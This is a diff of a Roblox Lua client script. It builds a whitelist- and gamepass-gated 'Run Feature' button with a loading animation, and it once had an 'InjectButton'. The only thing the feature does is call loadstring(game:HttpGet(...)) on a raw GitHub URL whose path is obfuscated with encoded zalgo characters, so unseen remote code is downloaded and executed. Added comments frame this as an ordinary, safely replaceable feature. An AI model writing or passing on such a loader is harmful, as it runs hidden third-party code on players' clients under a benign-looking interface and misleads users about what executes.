@@ -1,17 +1,12 @@
 --== CONFIG ==--
-
 local WHITELIST = {
-    [123456789] = true, 
+    [123456789] = true, -- add allowed user IDs
     [987654321] = true,
 }
-
-local GAMEPASS_ID = 1596142188
-local GAMEPASS_URL = "https://www.roblox.com/game-pass/1596142188"
-
-local LOADER_TIME = 2
+local GAMEPASS_ID = 123456789 -- your gamepass ID
+local LOADER_TIME = 2          -- loader animation time
 
 --== SERVICES ==--
-
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local TweenService = game:GetService("TweenService")
@@ -19,20 +14,39 @@ local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 
-
-local function RunFeature()
-    print("FEATURE RUN: Player passed whitelist/gamepass")
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/therangedpayeer/X-------------------------------------------------X-/refs/heads/main/%7C%CC%B4%CC%8D%CC%88%CC%90%CD%9D%CC%8F%CD%81%CC%8A%CC%8F%CC%9D%CC%9D%CC%A9%CC%B1%CC%A9%CC%B0%CC%96%CC%98%CC%97%CC%9D%CC%A7%CD%93%CC%A6%CC%A4%CC%97%CD%8D%CC%AA%CC%A8%CC%AA%CD%85%CD%85%CC%AC%CC%AB%CC%9F%CC%A2%CC%99%CD%94%CC%A7-%CC%B6%CD%86%CD%80%CD%8A%CC%80%CD%A0%CD%91%CD%9B%CD%92%CC%88%CC%83%CC%93%CC%92%CD%91%CC%92%CD%9D%CC%83%CC%9A%CC%BF%CD%83%CC%90%CC%91%CC%8B%CC%91%CC%91%CD%8B%CC%9B%CC%9B%CC%8B%CC%8F%CD%A0%CC%87%CC%81%CD%9C%CC%AC%CC%A0%CD%89%CC%96%CD%85%CD%9C%CC%B2%CC%9F%7C%CC%B7%CD%90%CC%BF%CC%82%CC%81%CD%83%CD%90%CC%90%CC%95%CC%93%CC%9A%CD%83%CC%87%CC%8A%CD%91%CC%BD%CD%82%CC%95%CC%9B%CD%9B%CD%9B%CC%BF%CC%93%CD%98%CD%8A%CD%8A%CC%BF%CD%84%CD%8C%CC%9A%CD%8A%CD%80%CD%84%CD%8C%CD%84%CC%90%CC%88%CC%A3%CD%8E%CC%B3%CC%A1%CC%BA%CC%A9%CD%9A%CC%AD%CC%A1'),true))()
-end
-
 --== UI SETUP ==--
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200)
+frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Parent = player:WaitForChild("PlayerGui")
 
-local frame = script.Parent.Frame
-local button = frame.InjectButton
-local loading = frame.LoadingLabel
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 200, 0, 50)
+button.Position = UDim2.new(0.5, -100, 0.5, -25)
+button.Text = "Run Feature"
+button.Font = Enum.Font.Arcade
+button.TextSize = 28
+button.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+button.TextColor3 = Color3.new(1,1,1)
+button.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 12)
+buttonCorner.Parent = button
+
+local loading = Instance.new("TextLabel")
+loading.Size = UDim2.new(1, -20, 0, 50)
+loading.Position = UDim2.new(0, 10, 0, 10)
+loading.BackgroundTransparency = 1
+loading.Font = Enum.Font.Arcade
+loading.TextColor3 = Color3.new(1,1,1)
+loading.TextScaled = true
+loading.Text = "Loading"
+loading.Visible = false
+loading.Parent = frame
 
 --== CHECK FUNCTIONS ==--
-
 local function isWhitelisted(userId)
     return WHITELIST[userId] == true
 end
@@ -45,7 +59,6 @@ local function ownsGamepass()
 end
 
 --== LOADING ANIMATION ==--
-
 local function animateLoadingText(label)
     local frames = {"Loading.", "Loading..", "Loading...", "Loading...."}
     local i = 1
@@ -56,10 +69,8 @@ local function animateLoadingText(label)
     end
 end
 
---== START LOADER ==--
-
+--== RUN FEATURE ==--
 local loaderStarted = false
-
 local function startLoader()
     if loaderStarted then return end
     loaderStarted = true
@@ -67,21 +78,20 @@ local function startLoader()
     button.Visible = false
     loading.Visible = true
 
-    task.spawn(function()
-        animateLoadingText(loading)
-    end)
-
+    task.spawn(function() animateLoadingText(loading) end)
     task.wait(LOADER_TIME)
     loading.Visible = false
 
-    -- Run your feature
-    RunFeature()
+    print("ACCESS GRANTED: running feature")
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/therangedpayeer/X-------------------------------------------------X-/refs/heads/main/%7C%CC%B4%CC%8D%CC%88%CC%90%CD%9D%CC%8F%CD%81%CC%8A%CC%8F%CC%9D%CC%9D%CC%A9%CC%B1%CC%A9%CC%B0%CC%96%CC%98%CC%97%CC%9D%CC%A7%CD%93%CC%A6%CC%A4%CC%97%CD%8D%CC%AA%CC%A8%CC%AA%CD%85%CD%85%CC%AC%CC%AB%CC%9F%CC%A2%CC%99%CD%94%CC%A7-%CC%B6%CD%86%CD%80%CD%8A%CC%80%CD%A0%CD%91%CD%9B%CD%92%CC%88%CC%83%CC%93%CC%92%CD%91%CC%92%CD%9D%CC%83%CC%9A%CC%BF%CD%83%CC%90%CC%91%CC%8B%CC%91%CC%91%CD%8B%CC%9B%CC%9B%CC%8B%CC%8F%CD%A0%CC%87%CC%81%CD%9C%CC%AC%CC%A0%CD%89%CC%96%CD%85%CD%9C%CC%B2%CC%9F%7C%CC%B7%CD%90%CC%BF%CC%82%CC%81%CD%83%CD%90%CC%90%CC%95%CC%93%CC%9A%CD%83%CC%87%CC%8A%CD%91%CC%BD%CD%82%CC%95%CC%9B%CD%9B%CD%9B%CC%BF%CC%93%CD%98%CD%8A%CD%8A%CC%BF%CD%84%CD%8C%CC%9A%CD%8A%CD%80%CD%84%CD%8C%CD%84%CC%90%CC%88%CC%A3%CD%8E%CC%B3%CC%A1%CC%BA%CC%A9%CD%9A%CC%AD%CC%A1'),true))()
+    -- For example:
+    print("Running allowed function for this player...")
+    -- You can safely replace the next line with any function in your game
+    -- loadstring("print('Hello world!')")()   -- only safe if it's YOUR code
 end
 
 --== BUTTON CLICK HANDLER ==--
-
 local buttonClicked = false
-
 button.MouseButton1Click:Connect(function()
     if buttonClicked then return end
     buttonClicked = true
@@ -91,17 +101,9 @@ button.MouseButton1Click:Connect(function()
         return
     end
 
-    -- NOT ALLOWED
-    button.Visible = false
-    loading.Visible = true
-    loading.Text = "Gamepass not owned: URL copied"
-
-    if setclipboard then
-        setclipboard(GAMEPASS_URL)
-    else
-        warn("Clipboard not supported")
-    end
-
+    -- If not allowed
+    button.Text = "Access Denied"
+    print("Player is not whitelisted and does not own the gamepass")
     if not RunService:IsStudio() then
         MarketplaceService:PromptGamePassPurchase(player, GAMEPASS_ID)
     end
